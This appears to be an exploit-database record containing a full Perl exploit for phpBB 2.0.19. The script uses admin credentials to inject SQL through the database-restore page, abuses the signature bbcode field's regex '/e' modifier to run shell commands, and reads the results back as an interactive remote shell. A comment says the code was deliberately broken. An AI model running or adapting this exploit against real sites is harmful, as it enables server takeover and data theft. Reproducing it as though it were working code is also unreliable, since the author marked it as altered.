{
  "id": "1661",
  "title": "phpBB 2.0.19 - &#039;user_sig_bbcode_uid&#039; Remote Code Execution",
  "cve": null,
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n\r\n## r57phpbba2e2.pl - phpBB admin 2 exec exploit \r\n## version 2 (based on user_sig_bbcode_uid bug)\r\n## tested on 2.0.12 , 2.0.13 , 2.0.19\r\n## --------------------------------------------\r\n## screen\r\n## r57phpbba2e2.pl -u http://192.168.0.2/phpBB-2.0.19/ -L admin -P password\r\n## Command for execute or 'exit' for exit # id\r\n## uid=80(www) gid=80(www) groups=80(www)\r\n## Command for execute or 'exit' for exit # exit \r\n## --------------------------------------------\r\n## *** surprise included ;) and broken. /str0ke\r\n## 20/02/06 \r\n## 1dt.w0lf\r\n## RST/GHC (http://rst.void.ru , http://ghc.ru)\r\n\r\nuse LWP::UserAgent;\r\nuse Getopt::Std;\r\nuse HTTP::Cookies;\r\n\r\ngetopts(\"u:L:P:i:p:o:\");\r\n\r\n$url      = $opt_u;\r\n$login    = $opt_L;\r\n$password = $opt_P;\r\n$id       = $opt_i || 2;\r\n$prefix   = $opt_p || 'phpbb_';\r\n$proxy    = $opt_o;\r\n\r\nif(!$url || !$login || !$password){&usage;}\r\n\r\n$|++;\r\n\r\n$xpl = LWP::UserAgent->new() or die;\r\n$cookie_jar = HTTP::Cookies->new();\r\n$xpl->cookie_jar( $cookie_jar );\r\n$xpl->proxy('http'=>'http://'.$proxy) if $proxy;\r\n$ids = 'IDS:r57 phpBB2 exploit a2e2#20022006|'.$url.'|'.$login.'|'.$password.'|'.$id.'|'.$prefix;\r\n $res = $xpl->post($url.'login.php',\r\n [\r\n \"username\"   => \"$login\",\r\n \"password\"   => \"$password\",\r\n \"autologin\"  => \"on\",\r\n \"admin\"      => \"1\",\r\n \"login\"      => \"Log in\",\r\n ],\"User-Agent\" => \"$ids\");\r\n $cookie_jar->extract_cookies($res);\r\n if($cookie_jar->as_string =~ /phpbb2mysql_sid=([a-z0-9]{32})/) { $sid = $1; }   \r\n while ()\r\n {\r\n    print \"Command for execute or 'exit' for exit # \";\r\n    while(<STDIN>)\r\n     {\r\n        $cmd=$_;\r\n        chomp($cmd);\r\n        exit() if ($cmd eq 'exit');\r\n        last;\r\n     }\r\n    &run($cmd);\r\n }\r\n \r\nsub run($)\r\n {   \r\n $sql   = \"UPDATE \".$prefix.\"users SET user_sig_bbcode_uid='(.+)/e\\0', user_sig='blah:`echo _START_ && \".$_[0].\" && echo _END_`' WHERE user_id=\".$id.\";\";\r\n &phpbb_sql_query(\"${url}admin/admin_db_utilities.php?sid=$sid\",$sql);   \r\n $res = $xpl->get($url.'profile.php?mode=editprofile&sid='.$sid,\"User-Agent\" => \"$ids\");\r\n @result = split(/\\n/,$res->content);\r\n $data = '';\r\n $on = $start = $end = 0;\r\n for (@result)\r\n  {\r\n    if (/_END_/) { $end = 1; last; }\r\n    if ($on) { $data .= $_.\"\\n\"; }\r\n    if (/_START_/) { $on = 1; $start = 1; } \r\n  }\r\n if($start&&$end) { print $data.\"\\r\\n\"; } \r\n }\r\n \r\nsub phpbb_sql_query($$){\r\n$res = $xpl->post(\"$_[0]\", \r\nContent_type => 'form-data',\r\nContent      => [ \r\n                perform       => 'restore',\r\n                restore_start => 'Start Restore',\r\n                backup_file   => [ \r\n                                   undef,\r\n                                   '0wneeeeedddd', \r\n                                   Content_type => 'text/plain',\r\n                                   Content => \"$_[1]\", \r\n                                 ],\r\n                ]\r\n,\"User-Agent\" => \"$ids\");\r\n} \r\n\r\nsub usage()\r\n {\r\n print \"\\\\=-----------------------------------=/\\r\\n\";\r\n print \"| phpBB admin2exec exploit by RST/GHC |\\r\\n\";\r\n print \"| version 2 (user_sig_bbcode_uid)     |\\r\\n\";\r\n print \"/=-----------------------------------=\\\\\\r\\n\";\r\n print \"\\r\\n Usage: r57phpbba2e2.pl [OPTIONS]\\r\\n\\r\\n\";\r\n print \" Options:\\r\\n\";\r\n print \" -u [URL] - path to forum e.g. http://site/forum/\\r\\n\";\r\n print \" -L [login] - admin login\\r\\n\";\r\n print \" -P [password] - admin password\\r\\n\";\r\n print \" -i [id] - admin id (optional, default 2)\\r\\n\";\r\n print \" -p [prefix] - table prefix (optional, default phpbb_)\\r\\n\";\r\n print \" -o [host:port] - proxy (optional)\\r\\n\";\r\n exit();\r\n }\r\n\r\n# milw0rm.com [2006-04-10]",
  "url": "https://www.exploit-db.com/exploits/1661"
}